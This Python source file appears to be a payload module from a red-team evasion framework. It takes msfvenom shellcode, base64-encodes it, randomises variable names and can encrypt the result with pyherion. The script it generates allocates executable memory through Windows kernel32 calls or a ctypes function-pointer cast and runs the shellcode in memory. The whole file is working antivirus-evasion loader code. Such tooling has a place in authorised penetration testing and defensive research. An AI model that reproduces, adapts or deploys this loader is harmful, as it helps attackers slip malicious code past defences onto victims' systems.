"""

This payload receives the msfvenom shellcode, base64 encodes it, and stores it within the payload.
At runtime, the executable decodes the shellcode and executes it in memory.


module by @christruncer

"""

import base64

from modules.common import shellcode
from modules.common import helpers
from modules.common import encryption


class Payload:
    
    def __init__(self):
        # required options
        self.description = "Base64 encoded shellcode is decoded at runtime and executed in memory"
        self.language = "python"
        self.rating = "Excellent"
        self.extension = "py"
        self.shellcode = shellcode.Shellcode()

        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
                                 "inject_method" : ["virtual", "[virtual]alloc or [void]pointer"]}

    def generate(self):
        if self.required_options["inject_method"][0].lower() == "virtual":
            # Generate Shellcode Using msfvenom
            Shellcode = self.shellcode.generate()
        
            # Base64 Encode Shellcode
            EncodedShellcode = base64.b64encode(Shellcode)    

            # Generate Random Variable Names
            ShellcodeVariableName = helpers.randomString()
            RandPtr = helpers.randomString()
            RandBuf = helpers.randomString()
            RandHt = helpers.randomString()
            RandT = helpers.randomString()
                    
            PayloadCode = 'import ctypes\n'
            PayloadCode +=  'import base64\n'
            PayloadCode += RandT + " = \"" + EncodedShellcode + "\"\n"
            PayloadCode += ShellcodeVariableName + " = bytearray(" + RandT + ".decode('base64','strict').decode(\"string_escape\"))\n"
            PayloadCode += RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + ShellcodeVariableName + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
            PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName  + ')).from_buffer(' + ShellcodeVariableName + ')\n'
            PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
            PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
            PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'

            if self.required_options["use_pyherion"][0].lower() == "y":
                PayloadCode = encryption.pyherion(PayloadCode)

            return PayloadCode

        else:

            # Generate Shellcode Using msfvenom
            Shellcode = self.shellcode.generate()

            # Generate Random Variable Names
            ShellcodeVariableName = helpers.randomString()
            RandShellcode = helpers.randomString()
            RandReverseShell = helpers.randomString()
            RandMemoryShell = helpers.randomString()
            DecodedShellcode = helpers.randomString()

            # Base64 Encode Shellcode
            EncodedShellcode = base64.b64encode(Shellcode)

            PayloadCode = 'from ctypes import *\n'
            PayloadCode += 'import base64\n'
            PayloadCode += ShellcodeVariableName + " = \"" + EncodedShellcode + "\"\n"
            PayloadCode += DecodedShellcode + " = bytearray(" + ShellcodeVariableName + ".decode('base64','strict').decode(\"string_escape\"))\n"
            PayloadCode += RandMemoryShell + ' = create_string_buffer(str(' + DecodedShellcode + '), len(str(' + DecodedShellcode + ')))\n'
            PayloadCode += RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
            PayloadCode += RandShellcode + '()'
    
            if self.required_options["use_pyherion"][0].lower() == "y":
                PayloadCode = encryption.pyherion(PayloadCode)

            return PayloadCode